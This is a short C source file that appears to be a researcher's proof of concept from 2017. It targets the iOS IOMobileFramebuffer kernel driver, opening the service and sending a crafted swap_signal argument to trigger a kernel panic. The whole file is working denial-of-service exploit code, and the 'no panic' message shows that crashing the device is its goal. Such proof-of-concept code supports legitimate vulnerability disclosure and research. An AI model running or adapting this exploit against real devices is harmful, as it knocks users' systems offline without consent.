//
//  IOMFB_DOS_1.c
//  IOMFB-DOS-1
//
//  Created by bazad on 11/30/17.
//  Copyright © 2017 bazad. All rights reserved.
//

#include "IOMFB_DOS_1.h"

#include "iokit.h"

#include <stdio.h>

#define ERR(fmt, ...)   fprintf(stderr, "error: " fmt "\n", ##__VA_ARGS__)

#define DBG(fmt, ...)   fprintf(stderr, fmt "\n", ##__VA_ARGS__)

int IOMFB_DOS_1() {
    printf("IOMFB_DOS_1\n");
    // Open IOMobileFramebuffer (AppleMobileADBE0).
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                       IOServiceMatching("IOMobileFramebuffer"));
    if (service == IO_OBJECT_NULL) {
        ERR("could not find %s", "IOMobileFramebuffer");
        return 1;
    }
    // Create the user client.
    io_connect_t connect;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
    if (kr != KERN_SUCCESS) {
        ERR("could not open %s: %x", "IOMobileFramebuffer", kr);
        return 2;
    }
    // swap_create.
    uint64_t swap_id;
    uint32_t swap_id_count = 1;
    kr = IOConnectCallMethod(connect, 4,
                        NULL, 0,
                        NULL, 0,
                        &swap_id, &swap_id_count,
                        NULL, NULL);
    if (kr != KERN_SUCCESS) {
        ERR("%s: %x", "swap_create", kr);
        return 3;
    }
    // swap_signal
    const uint32_t swap_signal_arg_count = 2;
    uint64_t swap_signal_args[swap_signal_arg_count] = { swap_id, 0x1839141 };
    kr = IOConnectCallMethod(connect, 20,
                        swap_signal_args, swap_signal_arg_count,
                        NULL, 0,
                        NULL, NULL,
                        NULL, NULL);
    if (kr != KERN_SUCCESS) {
        ERR("%s: %x", "swap_signal", kr);
        return 4;
    }
    ERR("no panic");
    return 0;
}
